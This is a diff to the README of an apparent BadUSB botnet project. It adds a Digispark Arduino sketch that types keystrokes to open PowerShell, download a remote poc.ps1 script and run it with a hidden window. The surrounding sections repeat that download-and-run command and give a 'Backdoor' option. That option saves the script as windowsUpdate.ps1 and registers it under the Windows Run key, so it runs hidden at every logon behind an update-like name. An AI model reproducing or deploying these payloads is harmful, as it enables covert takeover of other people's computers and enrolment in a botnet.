@@ -18,7 +18,7 @@ $githubScript = '<you_fork/poc.ps1>'
 
 ## Option 1
 
-```
+```powershell
 > (new-object net.webclient).DownloadFile('https://github.com/alexfrancow/badusb_botnet/blob/master/poc.ps1','poc.ps1')
 > powershell.exe -windowstyle hidden -file poc.ps1
 ```
@@ -39,9 +39,44 @@ DELAY 500
 ENTER
 ```
 
+### Digispark
+
+```c
+#include "DigiKeyboard.h"
+void setup() {
+}
+
+void loop() {
+DigiKeyboard.sendKeyStroke(0);
+DigiKeyboard.delay(500);
+DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
+DigiKeyboard.delay(500);
+DigiKeyboard.print("powershell");
+DigiKeyboard.sendKeyStroke(KEY_ENTER);
+DigiKeyboard.delay(500);
+DigiKeyboard.print("(new-object net.webclient).DownloadFile('https://github.com/alexfrancow/badusb_botnet/blob/master/poc.ps1','poc.ps1')");
+DigiKeyboard.sendKeyStroke(KEY_ENTER);
+DigiKeyboard.delay(500);
+DigiKeyboard.print("powershell.exe -windowstyle hidden -file poc.ps1");
+DigiKeyboard.sendKeyStroke(KEY_ENTER);
+for (;;) {
+/*empty*/
+}
+
+}
+```
+
+> Get the drivers: https://github.com/digistump/DigistumpArduino/releases
+
+> Additional Board Manager URL: https://raw.githubusercontent.com/digistump/arduino-boards-index/master/package_digistump_index.json
+
+> DigiKeyboard Source Code: https://github.com/digistump/DigisparkArduinoIntegration/blob/master/libraries/DigisparkKeyboard/DigiKeyboard.h
+
+
+
 ## Option 2 (Backdoor)
 
-```
+```powershell
 > reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run /v windowsUpdate /f
 > Invoke-WebRequest -Uri https://raw.githubusercontent.com/alexfrancow/badusb_botnet/master/poc.ps1 -OutFile C:\Users\$env:username\Documents\windowsUpdate.ps1
 > reg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run /v windowsUpdate /t REG_SZ /d "powershell.exe -windowstyle hidden -file C:\Users\$env:username\Documents\windowsUpdate.ps1"
